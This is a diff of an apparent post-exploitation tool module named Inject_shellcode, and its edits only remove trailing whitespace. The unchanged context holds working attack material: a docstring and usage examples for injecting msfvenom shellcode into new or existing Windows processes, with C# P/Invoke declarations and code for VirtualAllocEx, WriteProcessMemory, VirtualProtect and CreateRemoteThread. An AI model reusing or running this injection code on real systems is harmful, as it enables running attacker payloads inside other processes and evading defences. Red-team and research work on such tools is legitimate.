@@ -14,18 +14,18 @@ class Inject_shellcode(Module):
         You can choose to create a new process or use a pid of an existing process as a host process.
         If you create the payload for the shellcode from msfvenom ensure you use the flag --format raw.
         You can use one of the following supported injection techniques:
-            
+
             - remote_virtual:           classic injection:
                                         VirtualAllocEx (RWX) -> WriteProcessMemory -> CreateRemoteThread
             - remote_virtual_protect:   with this technique you never allocate RWX memory (polymorphic encoders won't work):
                                         VirtualAllocEx(RW) -> WriteProcessMemory -> VirtualProtect(RX) -> CreateRemoteThread
-        
+
         Note that when you try to inject into an existing process you should ensure you have the rights to open
         a handle to that process otherwise the injection cannot be performed.
-        
+
         Usage:
             #inject_shellcode shellcode_path [injection_type] [remote_process]
-        
+
         Positional arguments:
             shellcode_path              path to a file containing shellcode in raw format (msfvenom --format raw)
             injection_type              the process injection method to use for injecting shellcode
@@ -42,7 +42,7 @@ class Inject_shellcode(Module):
                 #inject_shellcode /path/to/shellcode 'remote_virtual_protect'
             Inject shellcode into an existing process
                 #inject_shellcode /path/to/shellcode 'remote_virtual' '1550'
-                                                
+
     """
 
     _runtime_code = r"""
@@ -59,24 +59,24 @@ class Inject_shellcode(Module):
 
                         [DllImport("kernel32.dll", SetLastError = true)]
                         static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-                        
+
                         [DllImport("kernel32.dll", SetLastError = true)]
                         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
 
                         [DllImport("kernel32.dll", SetLastError = true)]
                         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-                        
+
                         [DllImport("kernel32.dll", SetLastError=true)]
                         static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-                        
+
                         [DllImport("kernel32.dll", SetLastError = true)]
                         static extern bool CloseHandle(IntPtr hObject);
-                        
+
                         [DllImport("ntdll.dll", SetLastError = true)]
                         static extern UInt32 NtCreateThreadEx(ref IntPtr hThread,UInt32 DesiredAccess,IntPtr ObjectAttributes,IntPtr ProcessHandle,IntPtr StartAddress,IntPtr lParam,bool CreateSuspended,UInt32 StackZeroBits,UInt32 SizeOfStackCommit,UInt32 SizeOfStackReserve,IntPtr BytesBuffer);
 
                         const uint PAGE_ALIGN = 1024;
-                        
+
                         const int PROCESS_CREATE_THREAD = 0x0002;
                         const int PROCESS_QUERY_INFORMATION = 0x0400;
                         const int PROCESS_VM_OPERATION = 0x0008;
@@ -120,7 +120,7 @@ class Inject_shellcode(Module):
                                     return output;
                                 }
                                 output += "\n\n\tCorreclty opened a handle on process with pid " + targetProcessPid;
-                                
+
                                 uint codeMemorySize = (uint)(byteArrayCode.Length * Marshal.SizeOf(typeof(byte)) + 1);
                                 if(codeMemorySize %% PAGE_ALIGN != 0)
                                     codeMemorySize += PAGE_ALIGN - ((uint)(byteArrayCode.Length+1) %% PAGE_ALIGN);
@@ -184,7 +184,7 @@ class Inject_shellcode(Module):
                                     }
                                 }
                                 else{
-                                    output += "\n\n\tCode executed left in background as an async thread in the process '" + processName + ".exe' with pid " + targetProcessPid; 
+                                    output += "\n\n\tCode executed left in background as an async thread in the process '" + processName + ".exe' with pid " + targetProcessPid;
                                 }
                             }
                             catch (Exception ex)
@@ -200,7 +200,7 @@ class Inject_shellcode(Module):
                             }
                             return output + "\n\n";
                         }
-                        
+
                         private byte[] Decompress(byte[] data)
                         {
                             using (MemoryStream compressedStream = new MemoryStream(data))
@@ -227,13 +227,13 @@ class Inject_shellcode(Module):
                             byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                             return(output_func_byte);
                         }
-                    }   
+                    }
                     """
 
     _runtime_code_virtual = r"""
                     IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                     if(codeMemAddress == (IntPtr)0){
-                        output += error_string + "\n\tError allocating code buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error(); 
+                        output += error_string + "\n\tError allocating code buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error();
                         return output;
                     }
                     uint bytesWrittenCode;
